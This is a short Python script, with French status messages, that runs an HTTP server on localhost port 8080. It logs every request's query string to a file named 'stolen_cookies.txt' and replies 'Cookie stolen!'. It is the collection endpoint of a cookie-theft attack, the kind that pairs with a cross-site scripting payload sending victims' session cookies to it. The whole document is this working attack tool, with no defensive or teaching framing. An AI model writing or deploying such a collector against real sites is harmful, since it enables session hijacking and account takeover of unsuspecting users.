from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
import os

class CookieHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            query = urllib.parse.urlparse(self.path).query
            with open("stolen_cookies.txt", "a") as f:
                f.write(query + "\n")
            self.wfile.write(b"Cookie stolen!")
        except Exception as e:
            self.send_response(500)
            self.end_headers()
            self.wfile.write(f"Erreur: {str(e)}".encode())

try:
    server = HTTPServer(("localhost", 8080), CookieHandler)
    print("Serveur démarré sur http://localhost:8080")
    server.serve_forever()
except OSError as e:
    print(f"Erreur de démarrage du serveur : {e}")
    print("Vérifiez si le port 8080 est déjà utilisé. Essayez un autre port (ex. 8081).")
except KeyboardInterrupt:
    print("\nServeur arrêté.")
    server.server_close()